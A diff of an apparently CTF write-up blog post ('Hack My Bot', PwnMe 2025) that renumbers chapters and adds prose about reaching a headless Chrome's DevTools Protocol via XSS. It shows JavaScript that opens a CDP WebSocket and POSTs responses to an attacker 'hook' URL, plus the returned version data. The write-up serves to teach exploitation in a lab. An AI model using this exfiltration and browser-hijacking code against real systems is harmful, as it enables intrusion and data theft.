@@ -177,8 +177,7 @@
     <li><a href="#chapter-1-eagle-view">Chapter 1: Eagle View</a></li>
     <li><a href="#chapter-2-landing-our-xss">Chapter 2: Landing our XSS</a></li>
     <li><a href="#chapter-3-xss-delivery">Chapter 3: XSS Delivery</a></li>
-    <li><a href="#chapter-3-bot-control">Chapter 3: Bot Control</a></li>
-    <li><a href="#chapter-3-narrowing-in">Chapter 3: Narrowing In</a></li>
+    <li><a href="#chapter-4-bot-control">Chapter 4: Bot Control</a></li>
   </ul>
 </nav>
     </div>
@@ -486,7 +485,7 @@
 <p>Two seconds later, we receive a callback containing the first flag:
 <img src="/posts/hack-my-bot-pwnme-2025-ctf/flag1.png"></p>
 <p>Nice. We got our first flag!</p>
-<h2 id="chapter-3-bot-control">Chapter 3: Bot Control<a href="#chapter-3-bot-control" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h2 id="chapter-4-bot-control">Chapter 4: Bot Control<a href="#chapter-4-bot-control" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>So far, we found two primitives:</p>
 <ol>
 <li>A path traversal due to an off-by-slash nginx alias misconfiguration.</li>
@@ -589,9 +588,20 @@ drwx------  2 root root  4096 Mar  5 14:40  segmentation_platform
 </span></span><span style="display:flex;"><span>})
 </span></span></code></pre></div><p>Now that we have crafted the <code>devTools</code> CDP endpoint, let&rsquo;s confirm that we can talk to it by exfiltrating it&rsquo;s response back to us.</p>
 <p>First, we will look at the <a href="https://chromedevtools.github.io/devtools-protocol/">CDP documentation</a> to see how we can speak with it. I really recommend reading that page.</p>
-<p>The CDP protocol is based on web sockets, however it offers few convenience HTTP endpoints such as <code>/json/version</code> and <code>/json/list</code>.</p>
-<p>These endpoints are not accessible to us (I tried) due to SOP and CORS preventing us from reading them.</p>
-<p><img src="/posts/hack-my-bot-pwnme-2025-ctf/cdp-browser-getversion.png"></p>
+<p>The CDP protocol is based on web sockets. It also offers a few convenience HTTP endpoints such as <code>/json/version</code> and <code>/json/list</code>.</p>
+<p>If we try to access any of the HTTP endpoints, we will notice they are inaccessible to us and we are unable read them due to SOP and CORS.</p>
+<p>This confirms that the <code>--remote-allow-origins=*</code> flag affects web socket connections only.</p>
+<p>Let&rsquo;s try to connect to the web socket endpoint directly then. With some research, we notice that there is two kinds of APIs available us through CDP:</p>
+<ol>
+<li>Browser-level</li>
+<li>Page-level</li>
+</ol>
+<blockquote>
+<p><strong>Note:</strong> Page-level APIs are available if we are connected to a page context such as <code>/devtools/page/&lt;id&gt;</code>. However, we got a browser context endpoint <code>/devtools/browser/&lt;id&gt;</code> from the <code>DevToolsActivePort</code> we read earlier.</p>
+</blockquote>
+<p>We will keep this in mind as we move forward. For now, let&rsquo;s try to call a browser-level method such as <a href="https://chromedevtools.github.io/devtools-protocol/tot/Browser/#method-getVersion">Browser.getVersion</a></p>
+<p><img src="/posts/hack-my-bot-pwnme-2025-ctf/cdp-browser-getversion.png">
+Let&rsquo;s try:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>...
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">ws</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">WebSocket</span>(<span style="color:#a6e22e">devTools</span>)
 </span></span><span style="display:flex;"><span>
@@ -608,7 +618,20 @@ drwx------  2 root root  4096 Mar  5 14:40  segmentation_platform
 </span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#a6e22e">hook</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39;data&#39;</span>, {<span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;POST&#39;</span>, <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">data</span>)}).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">r</span> =&gt; <span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">text</span>())
 </span></span><span style="display:flex;"><span>};
 </span></span><span style="display:flex;"><span>...
-</span></span></code></pre></div><h2 id="chapter-3-narrowing-in">Chapter 3: Narrowing In<a href="#chapter-3-narrowing-in" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+</span></span></code></pre></div><p>This opens up a new WebSocket connection, <code>onopen</code>, it sends a JSON-encoded <code>Browser.getVersion</code> and will exfiltrate any response back to our hook through POST requests.</p>
+<p>Running this payload, we receive this back on our hook:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;id&#34;</span>: <span style="color:#ae81ff">1</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;result&#34;</span>: {
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;protocolVersion&#34;</span>: <span style="color:#e6db74">&#34;1.3&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;product&#34;</span>: <span style="color:#e6db74">&#34;Chrome/127.0.6533.88&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;revision&#34;</span>: <span style="color:#e6db74">&#34;@a2d0cb026721e4644e489b8ebb07038ca4e4351c&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;userAgent&#34;</span>: <span style="color:#e6db74">&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/127.0.0.0 Safari/537.36&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;jsVersion&#34;</span>: <span style="color:#e6db74">&#34;12.7.224.16&#34;</span>
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Excellent! We can communicate with CDP and get back responses.</p>
+<p>Sadly, we can not call methods such as <code>Page.navigate</code> yet because, as we said, we are not in a page context. Think we are controlling the browser, not a specific page yet.</p>
 
       </div></div>
 
